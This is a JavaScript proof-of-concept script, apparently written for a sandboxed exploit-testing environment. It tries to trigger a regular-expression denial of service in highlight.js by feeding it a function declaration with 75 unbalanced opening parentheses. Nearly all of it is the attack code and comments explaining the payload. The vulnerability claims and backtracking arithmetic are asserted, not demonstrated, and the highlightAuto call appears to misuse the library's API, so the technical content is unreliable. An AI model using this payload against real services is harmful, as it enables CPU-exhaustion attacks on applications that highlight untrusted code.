async function exploit() {
  const { highlightAuto } = await import('highlight.js');

  // The vulnerability stems from the regex used in highlight.js's JavaScript/TypeScript language parser
  // to count and validate nested parentheses within function signatures and arrow functions.
  // The problematic pattern roughly resembles (\([^)]*\))* to handle complex parameter lists.
  // Because this pattern contains overlapping possible matches for closing parentheses,
  // the regex engine falls into exponential backtracking O(2^N) when presented with a mismatched count.

  // We use N=75. Mathematically, the number of backtracking paths scales as ~1.618^N (Fibonacci growth).
  // For N=75, this yields approximately 3.8 × 10^15 operations, which vastly exceeds the 30,000 
  // backtrack threshold enforced by the VM/runtime configuration.
  const N = 75;

  // Payload construction:
  // - 'function demo( ' triggers the function declaration mode in the JS lexer.
  // - Repeated '(' pushes the parser into the nested-parameter counting regex.
  // - The insufficient number of closing parentheses prevents immediate success, forcing 
  //   the engine to exhaustively backtrack through all possible parenthesis groupings.
  const maliciousInput = `function demo( ${'('.repeat(N)} )` ;

  console.log('=== ReDoS Demonstration in highlight.js ===');
  console.log(`Triggering exponential backtracking with ${N} levels of nested parentheses...`);
  console.log('Expected outcome: CPU starvation or VM exception after exceeding the 30,000 backtrack limit.');

  // Intentionally omitting try/catch. If the underlying regex engine's backtracking tracker 
  // hits the configured threshold, the failure will propagate visibly in this environment.
  const result = await highlightAuto(maliciousInput, 'javascript');

  console.log('Highlighting completed:', result.language);
}

await exploit();
